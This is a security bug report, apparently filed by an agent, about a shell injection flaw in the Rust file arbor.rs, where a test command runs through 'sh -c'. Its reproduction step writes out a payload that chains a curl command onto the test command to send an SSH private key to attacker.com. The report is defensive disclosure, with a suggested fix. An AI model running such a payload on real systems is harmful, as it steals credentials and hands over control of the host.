---
labels: bug, agent-found, security
---

# Shell injection vulnerability in `arbor.rs` execution loop

## Description
The Arbor HTR Parallel Verification Loop executes candidate changes and tests using raw POSIX shell invocation (`sh -c`) inside a git worktree. If `self.test_command` comes from an untrusted source, user input, or an autonomous LLM (which is highly likely in agentic scenarios), an attacker or hallucinated command can inject arbitrary shell operators to execute unauthorized code on the host machine.

## Location
- File: `mythrax-core/src/cognitive/arbor.rs`
- Lines: 36-37

## Minimal Reproducible Scenario
1. Initialize an Arbor HTR loop where the `test_command` is parameterized or influenced by an LLM prompt.
2. Provide a malicious command payload: `cargo test; curl http://attacker.com/steal-keys -d "$(cat ~/.ssh/id_rsa)"`.
3. The string is passed directly into `Command::new("sh").arg("-c").arg(&self.test_command);`.
4. The injected commands execute with the same privileges as the running daemon, exposing secrets and host control.

## Severity
Critical - Remote Code Execution (RCE) / Sandbox Escape.

## Suggested Fix
Parse the command into explicit executable names and arguments instead of routing it through `sh -c`. If shell features are absolutely necessary, run them inside a strictly isolated sandbox (e.g., Docker container, Firecracker microVM) rather than executing them directly on the host machine.